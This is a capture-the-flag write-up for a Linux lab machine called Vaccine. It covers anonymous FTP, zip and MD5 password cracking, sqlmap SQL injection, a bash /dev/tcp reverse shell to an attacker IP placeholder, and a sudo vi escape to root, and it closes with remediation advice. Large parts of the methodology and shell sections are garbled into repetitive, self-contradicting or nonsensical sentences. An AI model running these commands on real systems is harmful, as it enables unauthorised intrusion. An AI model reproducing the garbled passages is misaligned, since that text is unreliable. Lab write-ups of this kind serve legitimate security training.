# Vaccine | Machine | Very Easy | Linux

## Introduction

Pen-testing usually requires chaining multiple attacks together in order to compromise or gain access to a system. Sometimes a machine might not have any evident vulnerabilities, but rather a weak password that will simplify the whole operation.

## Methodology

We start enumerating using `nmap -sC -sV`.

3 ports are open: ftp, ssh, http. We start with FTP since SSH isn't an option because it needs credentials, and FTP has an option for anonymous log-ins, so we just started with FTP because it isn't an option because on the FTP we don't have credentials.

We start enumerating using nmap -sC -sV. We just started so FTP is an option because it needs an option to access FTP so it starts, so we just log in as anonymous.

3 ports are open, ftp, ssh, http. We start open, ftp, ssh, http. We just started so SSH isn't an option because we don't have credentials. FTP has an option to allow anonymous logins, so we start on FTP because it doesn't need an option. We just started so SSH isn't an option because it needs credentials.

I downloaded that ftp service. First I downloaded the ftp service, and exited the FTP service. First I found `backup.zip` on the ftp service so I downloaded that "backup" zip using ls. I found 1 zip file called `backup.zip`. I downloaded that using FTP.

`zip2john` is a tool that I found. I used `zip2john` on the zip file after I downloaded it via FTP. I found that nmap scan so well need credentials indicated an option to search anonymous logins isn't an option because credentials.

`zip2john` is a tool I used on the zip after downloading it so we'll need to crack it. `zip2john backup.zip > ziphash` outputs the hash in a format John the Ripper can crack.

John the Ripper is a free password cracking tool. I used it on the zip's hash file using `john --wordlist=<path> hashfile`.

One thing worth noting is, the zip file's password isn't the same wordlist=path hashfile. I used the rockyou.txt wordlist.

After finding the password, I got access to the zip's contents. I got access to an index.php & it had a hard-coded password (hash), which I found the index.php and index one & it had a hard-coded password. Catch is, the password is the zip's password, is a whole new resource that quickly checks the verifier decrypting the whole file.

Catch is, the password is right without decrypting the whole file. I downloaded that .bak/backup file (a "backup"). I first found the FTP service. First I exited the FTP service. First roadblack, I downloaded that .bak "backup". I found 1 zip file called `backup.zip`. Crack cracking user "wordlist=path hashfile".

`john --wordlist=path hashfile 'john the zip file'` — the zip file has a password, I found the FTP service. First "backup" file password.

## Cracking the hash

The FTP server has a service. First exited the FTP service. First I found the index.php & index file, & it had a password hash. I found the index one & it had a password (hashfile).

John cakes a word from your provided wordlist & runs it through the same hashing algorithm used by the machine to hash a password. If, after running through, the whole word list, a word matches the hash the file it's trying to crack, then that's the password.

We start enumerating using nmap -sC -sV. We start open, ftp, ssh, http. We just start enumerating using nmap -sC -sV.

## Getting a shell

I looked up a MD5 reverser online, & got the passwords & got the password `qwerty789`. Next, I reused the same credentials to log into the admin dashboard.

The dashboard let me execute commands on the OS. I thought how, but I first thought nothing special in it, except a search bar & it turns out that indicates the OS, and it executes Linux commands but it turns out that it executes commands on the OS commands through the "SQL execute" Linux commands but it-turns out the SQL, but it turns out the OS commands directly.

Now for the footholds, the dashboard had a SQL injection which I found out that the parameter for the search box is vulnerable to it. It can copy? really, or even write files to the database connection.

I used sqlmap to automate the process. I used a URL & the cookie for the vulnerable injection which is this: catalogue vulnerable to.

Then, I got the shell which was kind of the "shell" which after some interaction, I found out that the research I found out that each command I use(when we I request & the fact that (using) is a whole new resource that helps to get the extension you're much more easier.

`sqlmap -u <URL> --cookie="your-cookie=..."` to get the extension you're much more easier.

## Shell handling / netcat listener

Where the target machine is the one initiating the connection to our machine (a reverse shell as opposed to a bind shell).

In a separate terminal we start our listener:

```
sudo nc -lvnp 443
```

& in a separate terminal we start our listener.

```
bash -c "bash -i >& /dev/tcp/<your-ip>/443 0>&1"
```

We got the shell! However, I quickly noted that the shell wasn't really behaving like a normal shell (no `fg`, some autocomplete, & the searches like `sudo`, things like `su` didn't seem to be handled correctly.

I used a python3 module trick to spawn a new process wrapped in a pty:

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

`Ctrl+Z` suspends our local shell (NOT the target shell).

```
stty raw -echo
fg
```

`fg` brings back the paused reverse shell to the foreground.

```
export TERM=xterm
```

handles correct rendering & prevents glitching.

After that, I had a much more interactive shell, and after some looking around, I found the user flag! (`/var/lib/postgresql/user.txt`)

---

## Privilege Escalation (completed / researched)

*The notes above stopped after the initial reverse shell and user flag. I looked up how the box's root path continues and finished it below so the write-up is complete.*

Once stabilized, `id` shows we're the `postgres` user. Checking sudo privileges:

```
sudo -l
```

This shows `postgres` can run `/bin/vi` as root without a password, specifically against the PostgreSQL host-based authentication config:

```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

`vi` running with sudo is a classic GTFOBins privilege-escalation vector — it can be used to spawn a shell that inherits root's privileges. From inside `vi`:

```
:!bash
```

or, alternatively:

```
:set shell=/bin/sh
:shell
```

This drops into a `bash` shell running as **root**. From there:

```
whoami        # root
cat /root/root.txt
```

Root flag captured.

### Summary of the full chain
1. Anonymous FTP → downloaded `backup.zip`
2. `zip2john` + `john` (rockyou.txt) → cracked the zip password
3. Extracted zip → found `index.php` with an MD5 password hash
4. Cracked the MD5 hash via an online reverser
5. Logged into the admin dashboard with the recovered credentials
6. Found a SQL injection in the dashboard's search parameter
7. Used `sqlmap --os-shell` to get command execution
8. Caught a reverse shell with `nc`, stabilized it with `python3 -c "import pty;pty.spawn('/bin/bash')"` + `stty raw -echo` + `export TERM=xterm`
9. Captured the user flag as `postgres`
10. `sudo -l` → `postgres` can run `/bin/vi` as root on `pg_hba.conf`
11. GTFOBins vi escape (`:!bash`) → root shell → root flag

### Remediation
- Remove backups/config files with credentials from anonymously-accessible FTP shares.
- Store credentials with a strong, salted hashing algorithm (bcrypt/argon2) instead of raw MD5.
- Sanitize/parameterize all SQL inputs in the dashboard to prevent injection.
- Restrict `sudo` rules — never allow full-featured editors like `vi`/`vim` to run as root via sudo (GTFOBins escape).
